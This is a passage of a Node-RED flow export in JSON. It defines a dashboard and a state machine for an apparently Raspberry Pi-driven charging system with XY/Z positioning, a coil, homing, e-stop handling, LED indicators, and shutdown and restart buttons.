flow.set(\"state\", \"turningOff\");\n    return [msgBtn, msg];\n}\n",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 480,
        "y": 1300,
        "wires": [
            [
                "164c3c6598b2abcc",
                "f841c1beaa0e8793"
            ],
            [
                "3cf48fa44fc1f38a",
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "1129285a1a684e71",
        "type": "inject",
        "z": "786f9546367d3e03",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "label",
                "v": "Initialize",
                "vt": "str"
            },
            {
                "p": "background",
                "v": "green",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": true,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 150,
        "y": 1420,
        "wires": [
            [
                "164c3c6598b2abcc",
                "365f252770f8c995",
                "7a936663ae236afb"
            ]
        ]
    },
    {
        "id": "365f252770f8c995",
        "type": "change",
        "z": "786f9546367d3e03",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "state",
                "pt": "flow",
                "to": "needsInit",
                "tot": "str"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 390,
        "y": 1420,
        "wires": [
            []
        ]
    },
    {
        "id": "c54dd3ef4b4d2602",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 2,
        "group": "0262e45575f50b1c",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Homed Z",
        "x": 680,
        "y": 1180,
        "wires": []
    },
    {
        "id": "a9eabe41d38b8bcf",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 4,
        "group": "0262e45575f50b1c",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Homed Y",
        "x": 960,
        "y": 1180,
        "wires": []
    },
    {
        "id": "f9cb2f7802534002",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 3,
        "group": "0262e45575f50b1c",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Homed X",
        "x": 820,
        "y": 1180,
        "wires": []
    },
    {
        "id": "3cf48fa44fc1f38a",
        "type": "debug",
        "z": "786f9546367d3e03",
        "name": "debug 17",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 660,
        "y": 1360,
        "wires": []
    },
    {
        "id": "f12b13f198b31cce",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var msgBtn = {\n    \"background\": \"color\",\n    \"label\": \"text\",\n    \"enabled\": false\n}\nvar msgCmd = {\n    \"cmd\": \"command\",\n    \"val\": [0],\n};\nvar state = flow.get(\"state\")\n\nif (!Boolean(msg.payload.val[0]) || !Boolean(msg.payload.val[1]) || !Boolean(msg.payload.val[2])) { // if error\n    msgBtn.background = \"red\"\n    msgBtn.label = \"E-STOP or ERROR\"\n    msgBtn.enabled = false\n    msgCmd.cmd = \"estop\"\n    msgCmd.val = [true]\n    msg.payload = msgCmd\n    flow.set(\"state\", \"error\");\n    return [msgBtn, msg];\n}\nelse if (state == \"error\") {\n    msgBtn.background = \"green\"\n    msgBtn.label = \"Initialize\"\n    msgBtn.enabled = true\n    msgCmd.cmd = \"estop\"\n    msgCmd.val = [false]\n    msg.payload = msgCmd\n    flow.set(\"state\", \"needsInit\");\n    return [msgBtn, msg];\n}\nelse if (state == \"initializing\") {\n    if (Boolean(msg.payload.val[9])) { // if enabled\n        msgBtn.background = \"green\"\n        msgBtn.label = \"Charge\"\n        msgBtn.enabled = true\n        flow.set(\"state\", \"ready\");\n        return [msgBtn, null];\n    }\n}\nelse if (state == \"markerNotDetected\") {\n    msgBtn.background = \"green\"\n    msgBtn.label = \"Charge\"\n    msgBtn.enabled = true\n    flow.set(\"state\", \"ready\");\n    return [msgBtn, null];\n}\nelse if (state == \"positioningXY\") {\n    if (Boolean(msg.payload.val[10])) { // if positioned in XY\n        msgBtn.background = \"orange\"\n        msgBtn.label = \"Positioning (Vertically)\"\n        msgBtn.enabled = false\n        msgCmd.cmd = \"moveZ\"\n        msgCmd.val = [-100]\n        msg.payload = msgCmd\n        flow.set(\"state\", \"positioningZ\");\n        return [msgBtn, msg];\n    }\n}\nelse if (state == \"positioningZ\") {\n    if (Boolean(msg.payload.val[10])) { // if positioned in Z\n        msgBtn.background = \"orange\"\n        msgBtn.label = \"Powering On Coil\"\n        msgBtn.enabled = false\n        msgCmd.cmd = \"coil\"\n        msgCmd.val = [true]\n        msg.payload = msgCmd\n        flow.set(\"state\", \"turningOn\");\n        return [msgBtn, msg];\n    }\n}\nelse if (state == \"turningOn\") {\n    if (Boolean(msg.payload.val[11])) { // if coil on\n        msgBtn.background = \"green\"\n        msgBtn.label = \"Checking Coil (Press to Stop)\"\n        msgBtn.enabled = true\n        flow.set(\"state\", \"checkingCoil\");\n        return [msgBtn, null];\n    }\n}\nelse if (state == \"checkingCoil\") {\n    if (Boolean(msg.payload.val[13])) { // if charging\n        msgBtn.background = \"green\"\n        msgBtn.label = \"Charging (Press to Stop)\"\n        msgBtn.enabled = true\n        flow.set(\"state\", \"charging\");\n        return [msgBtn, null];\n    }\n}\nelse if (state == \"turningOff\") {\n    if (!Boolean(msg.payload.val[11])) { // if coil off\n        msgBtn.background = \"orange\"\n        msgBtn.label = \"Positioning (Vertically)\"\n        msgBtn.enabled = false\n        msgCmd.cmd = \"moveZ\"\n        msgCmd.val = [0]\n        msg.payload = msgCmd\n        flow.set(\"state\", \"homingZ\");\n        return [msgBtn, msg];\n    }\n}\nelse if (state == \"homingZ\") {\n    if (Boolean(msg.payload.val[10])) { // if homed in Z\n        msgBtn.background = \"orange\"\n        msgBtn.label = \"Positioning (Horizontally)\"\n        msgBtn.enabled = false\n        msgCmd.cmd = \"moveXY\"\n        msgCmd.val = [0, 0]\n        msg.payload = msgCmd\n        flow.set(\"state\", \"homingXY\");\n        return [msgBtn, msg];\n    }\n}\nelse if (state == \"homingXY\") {\n    if (Boolean(msg.payload.val[10])) { // if homed in XY\n        msgBtn.background = \"green\"\n        msgBtn.label = \"Charge\"\n        msgBtn.enabled = true\n        flow.set(\"state\", \"ready\");\n        return [msgBtn, null];\n    }\n}\n",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 140,
        "y": 1300,
        "wires": [
            [
                "5af412509da4df53",
                "444f9f7f4450f020"
            ],
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "e38d57f77cd0baab",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 7,
        "group": "0262e45575f50b1c",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ffff00",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Conn",
        "x": 970,
        "y": 1240,
        "wires": []
    },
    {
        "id": "d58dd721798e589a",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 6,
        "group": "0262e45575f50b1c",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Coil",
        "x": 830,
        "y": 1240,
        "wires": []
    },
    {
        "id": "0c3727f949949f03",
        "type": "change",
        "z": "786f9546367d3e03",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "commandedX",
                "pt": "flow",
                "to": "payload.positionX",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "commandedY",
                "pt": "flow",
                "to": "payload.positionY",
                "tot": "msg"
            },
            {
                "t": "set",
                "p": "commandedResult",
                "pt": "flow",
                "to": "payload.result",
                "tot": "msg"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 780,
        "y": 700,
        "wires": [
            []
        ]
    },
    {
        "id": "bd3a4e6262e1fcf5",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 34,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Positioned",
        "x": 830,
        "y": 1040,
        "wires": []
    },
    {
        "id": "64c4f1b3c5eef63d",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 5,
        "group": "0262e45575f50b1c",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "Positioned",
        "x": 690,
        "y": 1240,
        "wires": []
    },
    {
        "id": "5af412509da4df53",
        "type": "debug",
        "z": "786f9546367d3e03",
        "name": "debug 18",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 300,
        "y": 1300,
        "wires": []
    },
    {
        "id": "a28218bef50e230c",
        "type": "delay",
        "z": "786f9546367d3e03",
        "name": "",
        "pauseType": "delay",
        "timeout": "2",
        "timeoutUnits": "seconds",
        "rate": "1",
        "nbRateUnits": "1",
        "rateUnits": "second",
        "randomFirst": "1",
        "randomLast": "5",
        "randomUnits": "seconds",
        "drop": false,
        "allowrate": false,
        "outputs": 1,
        "x": 300,
        "y": 1360,
        "wires": [
            [
                "164c3c6598b2abcc"
            ]
        ]
    },
    {
        "id": "444f9f7f4450f020",
        "type": "switch",
        "z": "786f9546367d3e03",
        "name": "",
        "property": "label",
        "propertyType": "msg",
        "rules": [
            {
                "t": "eq",
                "v": "Charge",
                "vt": "str"
            },
            {
                "t": "else"
            }
        ],
        "checkall": "true",
        "repair": false,
        "outputs": 2,
        "x": 130,
        "y": 1360,
        "wires": [
            [
                "a28218bef50e230c"
            ],
            [
                "164c3c6598b2abcc"
            ]
        ]
    },
    {
        "id": "248b6eb3acdd2901",
        "type": "comment",
        "z": "786f9546367d3e03",
        "name": "",
        "info": "States:\n - needsInit -> initializing (btn)\n - initializing -> ready (plc)\n - ready -> markerNotDetected/positioningXY (btn)\n - markerNotDetected -> ready (btn-dly)\n - positioningXY -> positioningZ (plc)\n - positioningZ -> charging (plc)\n - charging -> homingZ (btn)\n - homingZ -> homingXY (plc)\n - homingXY -> ready (plc)\n",
        "x": 780,
        "y": 160,
        "wires": []
    },
    {
        "id": "7a936663ae236afb",
        "type": "change",
        "z": "786f9546367d3e03",
        "name": "",
        "rules": [
            {
                "t": "set",
                "p": "autoHoming",
                "pt": "flow",
                "to": "true",
                "tot": "bool"
            }
        ],
        "action": "",
        "property": "",
        "from": "",
        "to": "",
        "reg": false,
        "x": 360,
        "y": 1460,
        "wires": [
            []
        ]
    },
    {
        "id": "8b9db6bfe5536407",
        "type": "inject",
        "z": "786f9546367d3e03",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "Shutdown",
        "payload": "",
        "payloadType": "str",
        "x": 660,
        "y": 60,
        "wires": [
            [
                "2068557865742e34"
            ]
        ]
    },
    {
        "id": "6f388652db214707",
        "type": "inject",
        "z": "786f9546367d3e03",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "Restart",
        "payloadType": "str",
        "x": 650,
        "y": 100,
        "wires": [
            [
                "203b2b8aa355649b"
            ]
        ]
    },
    {
        "id": "bacc55d72f25f9a5",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "a9d39887c31d9e5b",
        "order": 17,
        "width": 3,
        "height": 1,
        "passthru": false,
        "label": "Shutdown",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "Shutdown RPI",
        "topicType": "str",
        "x": 480,
        "y": 60,
        "wires": [
            [
                "2068557865742e34"
            ]
        ]
    },
    {
        "id": "027094f09893b0b3",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "a9d39887c31d9e5b",
        "order": 18,
        "width": 3,
        "height": 1,
        "passthru": false,
        "label": "Restart",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "",
        "payloadType": "str",
        "topic": "Restart RPI",
        "topicType": "str",
        "x": 480,
        "y": 100,
        "wires": [
            [
                "203b2b8aa355649b"
            ]
        ]
    },
    {
        "id": "203b2b8aa355649b",
        "type": "restart",
        "z": "786f9546367d3e03",
        "name": "",
        "x": 830,
        "y": 100,
        "wires": []
    },
    {
        "id": "2068557865742e34",
        "type": "shutdown",
        "z": "786f9546367d3e03",
        "name": "",
        "x": 840,
        "y": 60,
        "wires": []
    },
    {
        "id": "a26dba8baf61b32c",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var m={\n    \"cmd\":\"coil\",\n    \"val\": [true],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 60,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "b0ef674f3d24606d",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 15,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Coil On",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 60,
        "wires": [
            [
                "a26dba8baf61b32c"
            ]
        ]
    },
    {
        "id": "b1957bdc58b66ebf",
        "type": "function",
        "z": "786f9546367d3e03",
        "name": "",
        "func": "var m = {\n    \"cmd\": \"coil\",\n    \"val\": [false],\n};\nmsg.payload = m\n\nreturn msg;\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 300,
        "y": 100,
        "wires": [
            [
                "c72d1a494a6245b1"
            ]
        ]
    },
    {
        "id": "72d1ad2dc238286a",
        "type": "ui_button",
        "z": "786f9546367d3e03",
        "name": "",
        "group": "0f3fbbc1566187b3",
        "order": 16,
        "width": "2",
        "height": "1",
        "passthru": false,
        "label": "Coil Off",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "pressed",
        "payloadType": "str",
        "topic": "button",
        "topicType": "str",
        "x": 140,
        "y": 100,
        "wires": [
            [
                "b1957bdc58b66ebf"
            ]
        ]
    },
    {
        "id": "9507aa9d120ce7f6",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 37,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "chr_OK",
        "x": 680,
        "y": 1100,
        "wires": []
    },
    {
        "id": "1d7fc745d3712398",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 38,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "vert_IND",
        "x": 820,
        "y": 1100,
        "wires": []
    },
    {
        "id": "b09c7d257ecc2640",
        "type": "ui_led",
        "z": "786f9546367d3e03",
        "order": 39,
        "group": "0f3fbbc1566187b3",
        "width": 1,
        "height": 1,
        "label": "",
        "labelPlacement": "left",
        "labelAlignment": "left",
        "colorForValue": [
            {
                "color": "#ff0000",
                "value": "false",
                "valueType": "bool"
            },
            {
                "color": "#008000",
                "value": "true",
                "valueType": "bool"
            }
        ],
        "allowColorForValueInMessage": false,
        "shape": "circle",
        "showGlow": true,
        "name": "vert_OPT",
        "x": 960,
        "y": 1100,
        "wires": []
    },
    {
        "id": "f103e828ab2fd99e",
        "type": "ui_text",
        "z": "786f9546367d3e03",
        "group": "0f3fbbc1566187b3",
        "order": 36,
        "width": 3,
        "height": 1,
        "name": "",
        "label": "Char/Ind/Opt:",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "style": false,
        "font": "",
        "fontSize": "",
        "color": "#000000",
        "x": 160,
        "y": 1240,
        "wires": []
    }
]